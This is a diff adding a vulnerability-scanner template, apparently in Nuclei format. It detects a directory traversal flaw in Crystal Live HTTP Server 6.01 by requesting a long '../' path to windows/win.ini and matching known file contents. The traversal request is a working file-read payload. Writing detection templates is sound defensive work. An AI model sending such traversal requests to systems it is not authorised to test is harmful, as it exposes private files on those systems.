@@ -1,0 +1,19 @@
+id: crystal-live-server-lfi
+info:
+  author: 0x_Akoko
+  name: Crystal Live HTTP Server 6.01 - Directory Traversal
+  reference: https://cxsecurity.com/issue/WLB-2019110127
+  severity: high
+  tags: lfi,crystal
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  method: GET
+  path:
+  - '{{BaseURL}}/../../../../../../../../../../../../windows/win.ini'
